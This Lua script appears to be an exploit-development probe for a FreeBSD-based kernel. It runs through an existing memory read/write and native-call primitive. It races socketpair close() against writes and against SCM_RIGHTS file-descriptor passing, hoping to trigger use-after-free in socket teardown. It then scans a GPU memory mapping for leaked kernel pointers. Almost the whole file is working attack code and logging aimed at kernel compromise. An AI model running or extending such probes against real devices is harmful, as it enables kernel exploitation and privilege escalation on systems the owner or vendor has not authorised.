-- CRASH_CLASS: MODERATE
-- PROBE 155a: Socketpair close race via Thrd_create
--
-- Context: socketpair() creates a connected pair of sockets sharing kernel
-- state. Racing close() on one end while the other end is doing I/O can
-- expose UAFs in the socket teardown path. On FreeBSD 11, so_close() may
-- race with sorwakeup/sowwakeup when the peer is mid-operation.
--
-- Strategy:
--   1. Create socketpair (AF_UNIX, SOCK_STREAM)
--   2. Spawn threads doing atomic pressure
--   3. Main thread: write to fd[0] then immediately close fd[1]
--   4. Repeat many times with GPU mmap reclaim between rounds
--   5. Scan for kernel pointer contamination

print("=== PROBE 155a: SOCKETPAIR CLOSE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

if not (native and native.fcall_with_rax) then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 155a COMPLETE ===")
    return
end

local la = native.addrofs and native.addrofs.libc_addrofs
if not la then
    print("NEED libc_addrofs — aborting")
    print("=== PROBE 155a COMPLETE ===")
    return
end

local stub = syscall.pipe.fn_addr
local Thrd_create = la.Thrd_create
local Thrd_join = la.Thrd_join
local Atomic_fetch_add_8 = la.Atomic_fetch_add_8
local sc_mmap = make_syscall(477)

-- ============================================================
-- SECTION A: SOCKETPAIR BASELINE
-- ============================================================
print("")
print("--- SECTION A: SOCKETPAIR BASELINE ---")

-- sys 135 = socketpair(domain, type, protocol, sv)
-- AF_UNIX=1, SOCK_STREAM=1
local sv = memory.alloc(0x10)
safe_wd(sv, 0)
safe_wd(sv + 4, 0)

local sp_ret = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
local fd0 = safe_rd(sv)
local fd1 = safe_rd(sv + 4)
print(string.format("socketpair ret=%d fd0=%d fd1=%d", sp_ret, fd0 or -1, fd1 or -1))

if sp_ret ~= 0 then
    print("socketpair failed — aborting")
    print("=== PROBE 155a COMPLETE ===")
    return
end

-- Test write/read on the pair
local wbuf = memory.alloc(0x100)
safe_wq(wbuf, uint64(0xDEADBEEF12345678))
local wr = to_num(native.fcall_with_rax(stub, 4, fd0, to_num(wbuf), 8))
print("write(fd0, 8) ret=" .. wr)

local rbuf = memory.alloc(0x100)
safe_wq(rbuf, uint64(0))
local rr = to_num(native.fcall_with_rax(stub, 3, fd1, to_num(rbuf), 8))
print("read(fd1, 8) ret=" .. rr)
local readback = safe_rq(rbuf)
print("readback=" .. fmt_addr(readback))

-- Close baseline pair
native.fcall_with_rax(stub, 6, fd0)
native.fcall_with_rax(stub, 6, fd1)

-- ============================================================
-- SECTION B: RAPID SOCKETPAIR CREATE/CLOSE RACE
-- ============================================================
print("")
print("--- SECTION B: SOCKETPAIR CLOSE RACE ---")

local shared = memory.alloc(0x20)
local race_ok = 0
local race_fail = 0

for round = 1, 30 do
    safe_wq(shared, uint64(0))

    -- Spawn pressure threads
    local tids = {}
    for i = 1, 2 do
        local ok, t = pcall(function()
            return native.fcall_with_rax(Thrd_create, shared, Atomic_fetch_add_8, shared)
        end)
        if ok then tids[#tids + 1] = t end
    end

    -- Create socketpair
    safe_wd(sv, 0)
    safe_wd(sv + 4, 0)
    local sr = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
    local s0 = safe_rd(sv)
    local s1 = safe_rd(sv + 4)

    if sr == 0 and s0 and s1 then
        -- Write to fd0
        safe_wq(wbuf, uint64(0xAAAABBBBCCCCDDDD))
        native.fcall_with_rax(stub, 4, s0, to_num(wbuf), 64)

        -- Close fd1 while data is in-flight/buffered
        native.fcall_with_rax(stub, 6, s1)

        -- Try to write again to fd0 (peer is closed)
        local ok2, wr2 = pcall(function()
            return to_num(native.fcall_with_rax(stub, 4, s0, to_num(wbuf), 64))
        end)

        -- Close fd0
        native.fcall_with_rax(stub, 6, s0)

        race_ok = race_ok + 1
    else
        race_fail = race_fail + 1
    end

    -- Join threads
    for _, t in ipairs(tids) do
        pcall(function() native.fcall_with_rax(Thrd_join, t, uint64(0)) end)
    end

    -- Canary check every 10 rounds
    if round % 10 == 0 then
        local alive = pcall(function() return to_num(syscall.getpid()) end)
        if not alive then
            print("*** PROCESS DIED at round " .. round .. " ***")
            return
        end
        print("round " .. round .. " alive")
    end
end
print(string.format("race: ok=%d fail=%d", race_ok, race_fail))

-- ============================================================
-- SECTION C: SCM_RIGHTS FD PASSING RACE
-- ============================================================
print("")
print("--- SECTION C: SCM_RIGHTS CLOSE RACE ---")

-- SCM_RIGHTS: pass fds between socketpair ends. Closing the receiving
-- end while fds are in-flight can cause refcount issues.
-- sys 28 = sendmsg, sys 27 = recvmsg

-- msghdr structure:
--   msg_name      +0x00 (8)
--   msg_namelen   +0x08 (4)
--   pad           +0x0C (4)
--   msg_iov       +0x10 (8)
--   msg_iovlen    +0x18 (8)
--   msg_control   +0x20 (8)
--   msg_controllen +0x28 (8)
--   msg_flags     +0x30 (4)

-- cmsghdr:
--   cmsg_len      +0x00 (4 on 32-bit, 8 on 64-bit)
--   cmsg_level    +0x08 (4) SOL_SOCKET=0xFFFF
--   cmsg_type     +0x0C (4) SCM_RIGHTS=1

local scm_ok = 0
for round = 1, 20 do
    -- Create socketpair
    safe_wd(sv, 0)
    safe_wd(sv + 4, 0)
    local sr = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
    local s0 = safe_rd(sv)
    local s1 = safe_rd(sv + 4)

    if sr == 0 and s0 and s1 then
        -- Create a fd to pass (another socketpair or kqueue)
        local pass_fd = to_num(native.fcall_with_rax(stub, 362))  -- kqueue

        if pass_fd >= 0 then
            -- Build sendmsg with SCM_RIGHTS
            local iov = memory.alloc(0x20)
            local iovbuf = memory.alloc(0x10)
            safe_wq(iovbuf, uint64(0x41414141))
            safe_wq(iov, uint64(to_num(iovbuf)))  -- iov_base
            safe_wq(iov + 8, uint64(4))            -- iov_len

            -- Control message: CMSG_LEN(sizeof(int)) on 64-bit = 16 + 4 = 20?
            -- Actually on amd64: CMSG_LEN(4) = CMSG_ALIGN(sizeof(cmsghdr)) + 4
            -- sizeof(cmsghdr) on amd64 = 12 (with padding to 16)
            -- CMSG_LEN(4) = 16 + 4 = 20
            local cmsg = memory.alloc(0x40)
            safe_wq(cmsg, uint64(20))              -- cmsg_len = 20 (CMSG_LEN(sizeof(int)))
            safe_wd(cmsg + 8, 0xFFFF)              -- cmsg_level = SOL_SOCKET
            safe_wd(cmsg + 12, 1)                   -- cmsg_type = SCM_RIGHTS
            safe_wd(cmsg + 16, pass_fd)             -- the fd to pass

            local msghdr = memory.alloc(0x40)
            safe_wq(msghdr + 0x00, uint64(0))       -- msg_name = NULL
            safe_wd(msghdr + 0x08, 0)               -- msg_namelen = 0
            safe_wq(msghdr + 0x10, uint64(to_num(iov)))    -- msg_iov
            safe_wq(msghdr + 0x18, uint64(1))       -- msg_iovlen = 1
            safe_wq(msghdr + 0x20, uint64(to_num(cmsg)))   -- msg_control
            safe_wq(msghdr + 0x28, uint64(24))      -- msg_controllen

            -- Send the fd via SCM_RIGHTS
            local send_ret = to_num(native.fcall_with_rax(stub, 28, s0, to_num(msghdr), 0))

            -- Close the passed fd on sender side
            native.fcall_with_rax(stub, 6, pass_fd)

            -- Close receiving end before reading the message
            -- This is the race: the in-flight fd may leak or corrupt refcounts
            native.fcall_with_rax(stub, 6, s1)

            -- Close sender
            native.fcall_with_rax(stub, 6, s0)

            scm_ok = scm_ok + 1
        end
    end
end
print("scm_rights_rounds=" .. scm_ok)

-- Canary
local alive = pcall(function() return to_num(syscall.getpid()) end)
print("alive_after_scm=" .. tostring(alive))

-- ============================================================
-- SECTION D: GPU RECLAIM SCAN
-- ============================================================
print("")
print("--- SECTION D: GPU RECLAIM SCAN ---")

local gpu = sc_mmap(uint64(0), uint64(16 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gh, gl = get_hi_lo(gpu)
print(string.format("gpu=0x%X%08X", gh, gl))

local kptr_count = 0
local ksamples = {}
for off = 0, 16 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_count = kptr_count + 1
            if #ksamples < 20 then
                ksamples[#ksamples + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("kptr_count=" .. kptr_count)
for _, s in ipairs(ksamples) do print(s) end

local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624_vm=" .. vm)

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 155a COMPLETE ===")
